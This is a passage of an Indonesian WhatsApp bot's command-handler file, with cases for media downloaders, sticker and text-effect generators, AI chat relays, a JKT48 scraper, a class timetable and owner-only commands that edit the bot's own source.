    // Mengirimkan audio setelah mengirimkan pesan
    xyu.sendMessage(m.chat, {
        audio: fs.readFileSync('./src/mp3/script.mp3'), 
        mimetype: 'audio/mpeg', 
        ptt: true
    }, {quoted: m});
break;

case 'snobg': {
if (!quoted) return reply(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
if (/image/.test(mime)) {
let media = await xyu.downloadAndSaveMediaMessage(quoted)
let encmedia = await xyu.sendImageAsSticker(m.chat, await rmbg(media), verif, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
reply(`Send/Reply Images With Captions ${prefix+command}`)
}
}
break

/*
case 'ttimg':
case 'ttslide':
case 'tiktokslide': {
    if (!text) return xyu.sendMessage(m.chat, { text: 'Mana Kak Linknya?' });
    const urol = `https://dlpanda.com/id?url=${text}&token=G7eRpMaa`;
    const response = await axios.get(urol);
    const html = response.data;
    const $ = cheerio.load(html);
    const imgSrc = [];
    const creator = 'Ido404';

    $('div.col-md-12 > img').each((index, element) => {
        imgSrc.push($(element).attr('src'));
    });

    if (imgSrc.length === 0) return xyu.sendMessage(m.chat, { text: 'Tidak ada gambar ditemukan.' });
    await xyu.sendMessage(m.chat, { react: { text: '🕐', key: m.key } });

    for (let img of imgSrc) {
        await xyu.sendMessage(m.chat, { image: { url: img } });
    }
    await xyu.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
}
break
*/


case 'takashi': {
    if (!q) return m.reply(`*Nanya Apa?*`);

    if (/image|gambar/.test(mime)) {
        const media = await xyu.downloadAndSaveMediaMessage(quoted);
        let anuu = await uploadToCatbox(media); // Sesuaikan Dengan Uploader Kalian.
        const data = await fetchJson(`https://btch.us.kg/bardimg?url=${anuu.result.url}&text=${encodeURIComponent(q)}`);
        const aimsg = data.result;
        return await m.reply(aimsg);
    }    
    else if (/video|tiktok/.test(q)) {
        const wann = await (await fetch('https://api.siputzx.my.id/api/s/tiktok?query=' + q)).json();
        if (wann.data && wann.data.length > 0) {
            let videoUrl = wann.data[0].play;
            let title = wann.data[0].title;
            await xyu.sendMessage(m.chat, { video: { url: videoUrl }, caption: title }, { quoted: m });
        }
    }
    else if (/carikan|cari|buatkan|img/.test(q)) {
        const anu = await (await fetch('https://btch.us.kg/bingimg?text=' + encodeURIComponent(q))).json();
        if (anu.status && anu.result && anu.result.length > 0) {
            for (let i = 0; i < anu.result.length; i++) {
                await xyu.sendMessage(m.chat, {
                    image: { url: anu.result[i] },
                    caption: `🔮 *Hasil Image ke-${i + 1}*`
                }, { quoted: m });
            }
        }
    }
    else if (/brat/.test(q)) { // Integrasi dari 'brat2'
        const quo = args.length >= 1 ? args.join(" ") : m.quoted?.text || m.quoted?.caption || m.quoted?.description || null;
        if (!quo) return m.reply("Masukan teksnya woii");

        async function brat(text) {
            try {
                return await new Promise((resolve, reject) => {
                    if (!text) return reject("missing text input");
                    axios.get("https://brat.caliphdev.com/api/brat", {
                        params: { text },
                        responseType: "arraybuffer"
                    }).then(res => {
                        const image = Buffer.from(res.data);
                        if (image.length <= 10240) return reject("failed generate brat");
                        return resolve({ success: true, image });
                    });
                });
            } catch (e) {
                return { success: false, errors: e };
            }
        }

        const buf = await brat(quo);
        await xyu.imgToSticker(m.chat, buf.image, m, { packname: "Xyuraa", author: "Takashi - Botz" });
    }
    else if (/music|musik|play|putarkan/.test(q)) {
        let search = await yts(q);
        let firstVideo = search.all[0];
        let wann = await fetchJson(`https://api.vreden.my.id/api/ytmp3?url=${firstVideo.url}`);
        let data = wann.result;

        if (data.status) {
            let audioUrl = data.download.url;
            let audioTitle = data.metadata.title;
            let audioThumbnail = data.metadata.thumbnail || "https://files.catbox.moe/h18n1s.jpg";

            await xyu.sendMessage(m.chat, {
                audio: { url: audioUrl },
                mimetype: 'audio/mpeg',
                ptt: true,
                contextInfo: {
                    externalAdReply: {
                        showAdAttribution: true,
                        title: audioTitle || "Untitled",
                        body: `${botname}`,
                        sourceUrl: data.metadata.url,
                        thumbnailUrl: audioThumbnail,
                        mediaType: 1,
                        renderLargerThumbnail: true
                    }
                }
            }, { quoted: m });
        }
    }
    else {
        var wanz = await fetchJson(`https://btch.us.kg/openai?text=${encodeURIComponent(q)}`);
        var wan = wanz.result;
        await m.reply(wan);
    }
}
break;
case 'texttospech': case 'tts': case 'tospech': {
				if (!text) return m.reply('Mana text yg mau diubah menjadi audio?')
				let { tts } = require('./lib/tts')
				let anu = await tts(text)
				xyu.sendMessage(m.chat, { audio: anu, ptt: true, mimetype: 'audio/mpeg' }, { quoted: m })
			}
			break




case 'play': {
if (!text) return reply("masukan query")
await xyu.sendMessage(m.chat, { react: { text: '🕐', key: m.key } });
  const axios = require('axios');
  const yts = require('yt-search');
  const SaveTube = {
    qualities: { 
      audio: { 1: '32', 2: '64', 3: '128', 4: '192' }, 
      video: { 1: '144', 2: '240', 3: '360', 4: '480', 5: '720', 6: '1080', 7: '1440', 8: '2160' }
    },
    headers: { 
      'accept': '*/*', 
      'referer': 'https://ytshorts.savetube.me/', 
      'origin': 'https://ytshorts.savetube.me/', 
      'user-agent': 'Postify/1.0.0', 
      'Content-Type': 'application/json' 
    },
    cdn() { return Math.floor(Math.random() * 11) + 51; },
    async fetchData(url, cdn, body = {}) {
      const headers = { ...this.headers, 'authority': `cdn${cdn}.savetube.su` };
      try { 
        const response = await axios.post(url, body, { headers }); 
        return response.data; 
      } catch (error) { 
        console.error(`Error fetching data from cdn${cdn}.savetube.su:`, error.message);
        throw error; 
      }
    },
    async dl(link, qualityIndex, typeIndex) {
      const quality = this.qualities[typeIndex][qualityIndex];
      const cdnNumbers = Array.from({ length: 10 }, (_, i) => i + 51); // CDN dari 51 hingga 60
      let videoInfo, dlRes;

      for (const cdnNumber of cdnNumbers) {
        const cdnUrl = `cdn${cdnNumber}.savetube.su`;
        try {
          videoInfo = await this.fetchData(`https://${cdnUrl}/info`, cdnNumber, { url: link });
          const badi = { downloadType: typeIndex, quality, key: videoInfo.data.key };
          dlRes = await this.fetchData(`https://${cdnUrl}/download`, cdnNumber, badi);
          break; // Jika berhasil, keluar dari loop
        } catch (error) {
          console.error(`Failed to fetch from ${cdnUrl}, trying next CDN...`);
        }
      }

      if (!dlRes) {
        throw new Error('All CDN attempts failed.');
      }
      return { 
        link: dlRes.data.downloadUrl 
      };
    }
  };
  if (!text) return reply('Masukkan judul atau kata kunci untuk mencari video YouTube!');
  try {
    const search = await yts(text);
    const firstVideo = search.videos[0];
    if (!firstVideo) return reply('❌ Video tidak ditemukan!');
    // Memanggil fungsi dl dengan parameter yang benar
    const result = await SaveTube.dl(firstVideo.url, 4, "audio"); // Ubah "4" menjadi 4 (angka)
    // Mengirim hanya audio
    await xyu.sendMessage(m.chat, {
      audio: { url: result.link },
      mimetype: "audio/mp4",
      ptt: false // FALSE untuk tidak menggunakan thumbnail
    }, { quoted: m });
    
  } catch (error) {
    console.error(error);
    reply('❌ Terjadi kesalahan saat memproses permintaan Anda: ' + error.message);
  }
  await xyu.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
}
break;

case 'glitchtext':
case 'writetext':
case 'advancedglow':
case 'typographytext':
case 'pixelglitch':
case 'neonglitch':
case 'flagtext':
case 'flag3dtext':
case 'deletingtext':
case 'blackpinkstyle':
case 'glowingtext':
case 'underwatertext':
case 'logomaker':
case 'cartoonstyle':
case 'papercutstyle':
case 'watercolortext':
case 'effectclouds':
case 'blackpinklogo':
case 'gradienttext':
case 'summerbeach':
case 'luxurygold':
case 'multicoloredneon':
case 'sandsummer':
case 'galaxywallpaper':
case '1917style':
case 'makingneon':
case 'royaltext':
case 'freecreate':
case 'galaxystyle':
case 'lighteffects':{
if (!isGroup) return reply(mess.group)
if (!q) return reply(`Example : ${prefix+command} Takashi`) 
let link
if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
let haldwhd = await ephoto(link, q)
xyu.sendMessage(m.chat, { image: { url: haldwhd }, caption: `powerewd by Takashi` }, { quoted: m })
}
break

case 'liston': {
if (!m.isGroup) return reply(mess.group);
if (!isCreator) return reply(mess.owner)
let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
let online = [...Object.keys(store.presences[id]), botNumber]
await xyu.sendMessage(m.chat, { text: 'List Online:\n\n' + online.map(v => `> @` + v.replace(/@.+/, '')).join`\n`, mentions: online }, { quoted: verif }).catch((e) => reply('Fail'))
			}
			break

//================================================================================
case 'totalfitur':
 xyu.relayMessage(m.chat, {
 "requestPaymentMessage": {
 amount: { 
 value: 2022000,
 offset: 0,
 currencyCode: 'IDR'
 },
 amount1000: 55000000,
 background: null,
 currencyCodeIso4217: 'USD',
 expiryTimestamp: 0,
 noteMessage: {
 extendedTextMessage: {
 text: 
`*TOTAL FEATURE*

• BerJumlah ${totalFitur()} Fitur\n*Tipe :* Case

Silahkan ketik *.menu* untuk
Menampilkan menu utama`
 }
 },
 requestFrom: m.sender
 }
 }, {})
break
//===============================================================================
case 'hitungmundur': {
    const today = new Date(); // Tanggal hari ini
    
    // Tanggal-tanggal penting
    const ramadhan = new Date('2025-03-10'); // Ganti sesuai perkiraan awal Ramadhan
    const idulFitri = new Date('2025-04-10'); // Ganti sesuai tanggal Idul Fitri

    // Fungsi menghitung selisih hari
    const calculateDays = (date) => Math.ceil((date - today) / (1000 * 60 * 60 * 24));
    
    // Selisih hari
    const daysToRamadhan = calculateDays(ramadhan);
    const daysToIdulFitri = calculateDays(idulFitri);

    // Pesan hasil
    let message = `🌙 *Hitung Mundur*:\n\n`;
    message += `- Ramadhan: ${daysToRamadhan > 0 ? `${daysToRamadhan} hari lagi` : 'Sedang berlangsung atau sudah berlalu'}\n`;
    message += `- Idul Fitri: ${daysToIdulFitri > 0 ? `${daysToIdulFitri} hari lagi` : 'Sedang berlangsung atau sudah berlalu'}\n`;

    // Kirim pesan ke pengguna
    await xyu.sendMessage(m.chat, { text: message }, { quoted: m });
}
break;
//================================================================================
case "jadwal": case "mapel":
const days = ["Minggu", "Senin", "Selasa", "Rabu", "Kamis", "Jumat", "Sabtu"];
const today = new Date();
const currentDay = days[today.getDay()];

let schedule;

switch (currentDay) {
    case "Senin":
        schedule = `*>SENIN*\n• B. Inggris\n• IPAS\n• IPAS\n• Pendais\n• Pendais\n• Informatika`;
        break;
    case "Selasa":
        schedule = `*>SELASA*\n• Dasar Kejuruan\n• B. Indonesia\n• Dasar Kejuruan\n• Matematika`;
        break;
    case "Rabu":
        schedule = `*>RABU*\n• Penjas\n• Dasar Kejuruan\n• B. Inggris\n• Informatika`;
        break;
    case "Kamis":
        schedule = `*>KAMIS*\n• Sejarah\n• PPKn\n• B. Indonesia\n• Seni Budaya\n• Matematika`;
        break;
    case "Jumat":
        schedule = `*>JUMAT*\n• B. Jawa\n• Dasar Kejuruan\n• IPAS`;
        break;
    default:
        schedule = `Tidak ada jadwal untuk hari ini.`;
        break;
}

const message = `*JADWAL PELAJARAN ‼️*\n\nHari: ${currentDay}\n\n${schedule}`;

await xyu.relayMessage(m.chat, {
    requestPaymentMessage: {
        currencyCodeIso4217: 'IDR',
        amount1000: 1000000000,
        requestFrom: m.sender,
        noteMessage: {
            extendedTextMessage: {
                text: message,
                contextInfo: {
                    externalAdReply: {
                        showAdAttribution: true,
                    }
                }
            }
        }
    }
}, {})
break;
//===============================================================================

case 'qc': {
 if (!q) return reply('Enter Text');
 const ppnyauser = await xyu.profilePictureUrl(m.sender, 'image').catch(_ => 'https://telegra.ph/file/6880771a42bad09dd6087.jpg');
 const json = {
 "type": "quote",
 "format": "png",
 "backgroundColor": "#FFFFFF",
 "width": 512,
 "height": 768,
 "scale": 2,
 "messages": [
 {
 "entities": [],
 "avatar": true,
 "from": {
 "id": 1,
 "name": pushname,
 "photo": {
 "url": ppuser
 }
 },
 "text": q,
 "replyMessage": {}
 }
 ]
 };

 const res = await axios.post('https://bot.lyo.su/quote/generate', json, {
 headers: {'Content-Type': 'application/json'}
 });
 const buffer = Buffer.from(res.data.result.image, 'base64');
 const rest = { 
 status: "200", 
 creator: "AdrianTzy",
 result: buffer
 };

 xyu.sendImageAsSticker(m.chat, rest.result, m, {
 packname: `${global.packname}`,
 author: `${global.author}`
 });
}
break

//===============================================================================
case 'totag':
if (!isCreator) return reply(mess.owner)
if (!m.isGroup) return reply(mess.group)
if (!m.quoted && !text) return reply(`Reply messages with captions ${prefix + command}`)
xyu.sendMessage(m.chat, {
forward: m.quoted.fakeObj,
mentions: participants.map(a => a.id)
     })
break

//===============================================================================

case 'yts': case 'ytsearch': {
  if (!text) return reply(`Example : ${prefix + command} title`);
  try {
let yts = require("yt-search")
    let search = await yts(text);
    let videos = search.all;
    console.log(videos)
    if (!videos || videos.length === 0) {
      reply('No video found');
      return;
    }
    // Choose between 1 and 5 videos at random
    const numVideos = Math.min(videos.length, Math.floor(Math.random() * 10) + 1);
    const selectedVideos = [];
    while (selectedVideos.length < numVideos) {
      const randomIndex = Math.floor(Math.random() * videos.length);
      const randomVideo = videos.splice(randomIndex, 1)[0]; // Avoid selecting the same videos
      selectedVideos.push(randomVideo);
    }
    let push = [];
    for (let i = 0; i < selectedVideos.length; i++) {
      let video = selectedVideos[i];
      let cap = `Title : ${video.title}`;
      const mediaMessage = await prepareWAMessageMedia({ image: { url: video.thumbnail } }, { upload: xyu.waUploadToServer });
      push.push({
        body: proto.Message.InteractiveMessage.Body.fromObject({
          text: cap
        }),
        footer: proto.Message.InteractiveMessage.Footer.fromObject({
          text: botname
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          title: `Video ${i + 1}`,
          subtitle: '',
          hasMediaAttachment: true,
          ...mediaMessage
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
          buttons: [
            {
              "name": "cta_copy",
              "buttonParamsJson": `{"display_text":"Copy Url","id":"1234","copy_code":"${video.url}"}`
            }
          ]
        })
      });
    }
    const msg = generateWAMessageFromContent(m.chat, {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2
          },
          interactiveMessage: proto.Message.InteractiveMessage.fromObject({
            body: proto.Message.InteractiveMessage.Body.create({
              text: ownername
            }),
            footer: proto.Message.InteractiveMessage.Footer.create({
              text: botname
            }),
            header: proto.Message.InteractiveMessage.Header.create({
              hasMediaAttachment: false
            }),
            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
              cards: push
            }),
            contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363186130999681@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
          })
        }
      }
    }, {quoted:m});
    await xyu.relayMessage(m.chat, msg.message, {
      messageId: msg.key.id
    });
  } catch (e) {
    console.error(e);
    await reply(`Error`);
  }
}
break
//===============================================================================

case "instagram": case "igdl": case "ig": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await xyu.sendMessage(m.chat, { react: { text: '🕖', key: m.key } })
await fetchJson(`https://api.tioo.eu.org/download/igdl?url=${text}`).then(async (res) => {
          if (!res.status) return m.reply("Error! Result Not Found")
          await xyu.sendMessage(m.chat, { video: { url: res.result[0].url }, mimetype: "video/mp4", caption: "*Instagram Downloader ✅*" }, { quoted: m })
          await xyu.sendMessage(m.chat, { react: { text: '', key: m.key } })
}).catch((e) => m.reply("Error! Result Not Found"))
      }
break
//=================================================//
case "fasebook":
case "fb":{
if (!text) return m.reply("Mana URL-nya?");
const { data } = await axios.post("https://allvideodownloader.cc/wp-json/aio-dl/video-data/", { url: text });
await xyu.sendMessage(m?.chat, { video: { url: data.medias[0].url }, caption: "done", fileName: `tiktok.mp4`, mimetype: 'video/mp4' })
}
break;
//================================================================================
case 'bard': {
  if (!text) {
    return reply('Masukkan teks, contoh: .bard Jelaskan topik ini.');
  }
  try {
    const yudd = await fetchJson(`https://api.tioo.eu.org/bard?text=${encodeURIComponent(text)}`);
    if (yudd && yudd.result) {
      await reply(yudd.result);
    } else {
      await reply('Tidak ada hasil dari API.');
    }
  } catch (e) {
    console.error(e);
    return reply('Terjadi kesalahan, coba lagi nanti.');
  }
}
break;


case 'jkt48info': {
  const axios = require('axios');
  const cheerio = require('cheerio');

  function shuffle(array) {
    for (let i = array.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [array[i], array[j]] = [array[j], array[i]];
    }
    return array;
  }

  async function scrapeJkt48(query) {
    try {
      if (query === 'berita') {
        const newsResponse = await axios.get('https://jkt48.com/news/list?lang=id');
        const $ = cheerio.load(newsResponse.data);
        const newsList = [];
        $('.entry-news__list').each((_, element) => {
          const title = $(element).find('.entry-news__list--item h3 a').text().trim();
          const link = $(element).find('.entry-news__list--item h3 a').attr('href');
          const date = $(element).find('.entry-news__list--item time').text().trim();
          newsList.push({ title, link: `https://jkt48.com${link}`, date });
        });
        const randomNews = shuffle(newsList).slice(0, Math.max(10, newsList.length));
        return `*📢 Berita JKT48 :*\n\n${randomNews.map((item, idx) => `${idx + 1}. ${item.title}\n   Link: ${item.link}\n   Tanggal: ${item.date}`).join('\n\n')}`;
      } else if (query === 'jadwal') {
        const eventResponse = await axios.get('https://jkt48.com');
        const $ = cheerio.load(eventResponse.data);
        const schedule = [];
        $('.entry-schedule__calendar .table tbody tr').each((_, element) => {
          const dateText = $(element).find('td h3').html().trim();
          const date = dateText.split('<br>')[0].trim();
          const day = dateText.split('<br>')[1].replace(/[()]/g, '').trim();
          const events = [];
          $(element).find('.contents p a').each((_, eventElement) => {
            const event = $(eventElement).text().trim();
            const link = $(eventElement).attr('href');
            events.push({ event, link: `https://jkt48.com${link}` });
          });
          schedule.push({ date, day, events });
        });
        const randomSchedule = shuffle(schedule).slice(0, Math.max(10, schedule.length));
        return `*📅 Jadwal JKT48 :*\n\n${randomSchedule.map((item, idx) => `${idx + 1}. ${item.date} (${item.day})\n   Acara: ${item.events.map(e => e.event).join(', ')}`).join('\n\n')}`;
      } else if (query === 'member') {
        const memberResponse = await axios.get('https://jkt48.com/member/list?lang=id');
        const $ = cheerio.load(memberResponse.data);
        const members = [];
        $('div.col-4.col-lg-2').each((_, element) => {
          const name = $(element).find('.entry-member__name a').html().replace(/<br\s*\/?>/g, ' ').trim();
          const profileLink = $(element).find('.entry-member a').attr('href');
          const imageSrc = $(element).find('.entry-member img').attr('src');
          members.push({
            name,
            profileLink: profileLink ? `https://jkt48.com${profileLink}` : null,
            imageSrc: imageSrc ? `https://jkt48.com${imageSrc}` : null,
          });
        });
        const randomMembers = shuffle(members).slice(0, Math.max(10, members.length));
        return `*Member JKT48 :*\n\n${randomMembers.map((member, idx) => `${idx + 1}. ${member.name}\n   Profil: ${member.profileLink}`).join('\n\n')}`;
      } else {
        return `❌ Query tidak dikenal. Gunakan salah satu dari: *berita*, *jadwal*, *member*\n\ncontoh : ${prefix + command } berita`;
      }
    } catch (err) {
      return `Terjadi kesalahan: ${err.message}`;
    }
  }

  const query = args[0]?.toLowerCase();
  scrapeJkt48(query).then(response => {
    xyu.sendMessage(from, { text: response }, { quoted: m });
  }).catch(err => {
    xyu.sendMessage(from, { text: `Error: ${err.message}` }, { quoted: m });
  });

  break;
}

//===============================================================================
case 'tiktok':
case 'tt': {
if (!m.quoted && !text) return reply('mana link tiktoknya?')
    if (args.length == 0) return reply(`Example: ${prefix + command} link lu`)
    const api = require('btch-downloader')
    if (!args[0]) return reply(`Masukan URL!\n\ncontoh:\n${prefix + command} https://vm.tiktok.com/ZGJAmhSrp/`);
    if (!args[0].match(/tiktok/gi)) return reply(`URL Yang Tuan Berikan *Salah!!!*`);
    let link = text || m.quoted.text; // Gunakan teks dari reply jika text tidak diberikan
    if (!link) return reply('Mana Kak Linknya?');
    try {
        await xyu.sendMessage(m.chat, { react: { text: '🕐', key: m.key } });
        let maximus = await api.ttdl(args[0]);
        let caption = `乂 *T I K T O K  D O W N L O A D* \n\n• *ɴᴀᴍᴀ ᴠɪᴅᴇᴏs:* \n${maximus.title}\n\n• *ɴᴀᴍᴀ ᴀᴜᴅɪᴏ:* \n${maximus.title_audio}\n\n${global.botname}`;
        
        await xyu.sendMessage(m.chat, { video: { url: maximus.video[0] }, caption: caption });
        await xyu.sendMessage(m.chat, { audio: { url: maximus.audio[0] }, mimetype: "audio/mpeg", ptt: true }, { quoted: m });
        await xyu.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
    } catch (e) {
        console.log(e);
        reply(e);
    }
}
break

//================================================================================

case 'renamecase':
    if (!q) return m.reply('Format tidak valid. Contoh: renamecase izintes|izintesnew');
    if (!isCreator) return m.reply('Khusus owner');
    // Pisahkan input menjadi nama case lama dan nama case baru
    const [oldCaseName, newCaseName] = q.split('|').map(name => name.trim());
    if (!oldCaseName || !newCaseName) {
        return m.reply('Format tidak valid. Contoh: renamecase izintes|izintesnew');
    }
    // Path ke file yang berisi switch-case
    const rinembos = path.join(__dirname, 'case.js');
    try {
        // Baca file secara sinkron
        let data = fs.readFileSync(rinembos, 'utf8');
        // Ekspresi reguler untuk mencari case berdasarkan nama lama
        const caseRegex = new RegExp(`case\\s+'${oldCaseName}'\\s*:\\s*`, 'g');
        const startIndex = data.search(caseRegex);
        if (startIndex === -1) {
            return m.reply(`Case '${oldCaseName}' tidak ditemukan.`);
        }
// Cari case berikutnya setelah case yang dicari
        const nextCasePattern = /case\s+'/g;
        nextCasePattern.lastIndex = startIndex + 1;
        const nextCaseMatch = nextCasePattern.exec(data);
        // Update nama case
        const updatedData = data.replace(caseRegex, `case '${newCaseName}':`);
        // Tulis kembali ke file
        fs.writeFileSync(rinembos, updatedData, 'utf8');
        m.reply(`Case '${oldCaseName}' sukses menjadi '${newCaseName}'!`);
    } catch (err) {
        console.error(err);
        m.reply('Terjadi kesalahan saat membaca atau menulis file.');
    }
    break;
    
//================================================================================

    case 'editcase':
    if (!q) return m.reply('Mana case yang ingin diedit? Format: .editcase case \'namafitur\':\n\n<kode baru>');
    if (!isCreator) return m.reply('Khusus owner');
    const caseNameRegex = /case\s+'([^']+)':/; 
    const match = q.match(caseNameRegex);
    if (!match) {
        return m.reply('Format tidak benar. Contoh: .editcase case \'namafitur\':\n\n<kode baru>');
    }
    const caseName = match[1]; 
    const newCode = q.replace(caseNameRegex, '').trim(); 
    const filenyabang = path.join(__dirname, 'case.js');

    try {
        
        let data = fs.readFileSync(filenyabang, 'utf8');
        const caseRegex = new RegExp(`case\\s+'${caseName}'\\s*:\\s*`, "g");
        const startIndex = data.search(caseRegex);

        if (startIndex !== -1) {
            let endIndex = -1;
            const breakPattern = /break\s*;/g;
            breakPattern.lastIndex = startIndex;
            const breakMatch = breakPattern.exec(data);
            if (breakMatch) {
                endIndex = breakMatch.index + breakMatch[0].length;
            }           
            const nextCasePattern = /case\s+'/g;
            nextCasePattern.lastIndex = startIndex + 1;
            const nextCaseMatch = nextCasePattern.exec(data);

            if (nextCaseMatch && (endIndex === -1 || nextCaseMatch.index < endIndex)) {
                endIndex = nextCaseMatch.index;
            }
            if (endIndex !== -1) {
                const updatedCode = `case '${caseName}':\n${newCode}\n`;
                data = data.slice(0, startIndex) + updatedCode + data.slice(endIndex);
                fs.writeFileSync(filenyabang, data, 'utf8');
                m.reply(`Succesfully update case ${q}!`);
            } else {
                m.reply('Maaf, tidak ditemukan akhir yang jelas untuk case tersebut.');
            }
        } else {
            m.reply('Sorry, case nya gada di file case.js');
        }
    } catch (err) {
        console.error(err);
        m.reply('Eror, silahkan cek console untuk lihat apa yang eror');
    }
    break;

//================================================================================

case 'sf': case 'sfile': case 'sfiledl': case 'sfdl': {

if (!text.includes('https://sfile.mobi')) return reply(`• *Example :* .${command} https://sfile.mobi/xxxxxxx/`)

reply(mess.wait)

/*
💥 *SFILE DOWNLOADER*

💨 Options:
- Search (Query) + Page
- Top Trending + Page
- Latest Upload + Page
- Download

🧑‍💻 Script Code by Daffa
*/

const sfile = {
 latest_uploads: async function(page = 1) {
 try {
 const res = await axios.get('https://sfile.mobi');
 const cookies = res.headers['set-cookie'].map(cookie => cookie.split(';')[0]).join('; ');
 const headers = {
 'cookie': cookies,
 'referer': 'https://sfile.mobi/uploads.php',
 'user-agent': 'Postify/1.0.0'
 };
 const uploads = await axios.get(`https://sfile.mobi/uploads.php?page=${page}`, { headers });
 const $ = cheerio.load(uploads.data);

 const data = $('.list').map((_, el) => ({
 title: $(el).find('a').text().trim(),
 link: $(el).find('a').attr('href'),
 size: $(el).find('small').text().match(/(\d+(?:\.\d+)?\s[KMGT]B)/)?.[1],
 uploadDate: $(el).find('small').text().match(/Uploaded:\s([\d\-a-zA-Z]+)/)?.[1]
 })).get().filter(item => item.title && item.link && item.size && item.uploadDate);

 return { creator: 'Daffa ~', status: 'success', code: 200, data };
 } catch (error) {
 console.error(error);
 return { creator: 'Daffa ~', status: 'error', code: 500, data: [], message: 'An error occurred while fetching the latest updates.' };
 }
 },

 top_trending: async function(page = 1) {
 try {
 const response = await axios.get('https://sfile.mobi');
 const cookies = response.headers['set-cookie'].map(cookie => cookie.split(';')[0]).join('; ');
 const headers = {
 'authority': 'sfile.mobi',
 'accept': 'application/json, text/html, application/xhtml+xml, application/xml;q=0.9, image/avif, image/webp, image/apng, */*;q=0.8, application/signed-exchange;v=b3;q=0.7',
 'cookie': cookies,
 'referer': `https://sfile.mobi/top.php?page=${page}`,
 'user-agent': 'Postify/1.0.0'
 };
 const top = await axios.get(`https://sfile.mobi/top.php?page=${page}`, { headers });
 const $ = cheerio.load(top.data);

 const data = $('.list').map((_, el) => {
 const title = $(el).find('a').text().trim();
 const link = $(el).find('a').attr('href');
 const [size, downloadInfo] = $(el).find('small').text().split(', Download: ').map(e => e.trim());
 const [downloadCount, uploadedDate] = downloadInfo ? downloadInfo.split(' Uploaded: ').map(e => e.trim()) : [undefined, undefined];

 return title && link && size && downloadCount && uploadedDate ? 
 { title, link, size, downloadCount, uploadDate: uploadedDate } : null;
 }).get().filter(item => item);

 return { creator: 'Daffa ~', status: 'success', code: 200, data };
 } catch (error) {
 console.error(error);
 return { creator: 'Daffa ~', status: 'error', code: 500, data: [], message: 'An error occurred while fetching the top trending files.' };
 }
 },
 
 search: async function(query, page = 1) {
 try {
 const url = `https://sfile.mobi/search.php?q=${query}&page=${page}`;
 const response = await axios.get(url, {
 headers: {
 'authority': 'sfile.mobi',
 'accept': 'application/json, text/html, application/xhtml+xml, application/xml;q=0.9,*/*;q=0.8',
 'referer': url,
 'user-agent': 'Postify/1.0.0'
 }
 });

 const $ = cheerio.load(response.data);
 
 const data = $('.list').map((_, el) => {
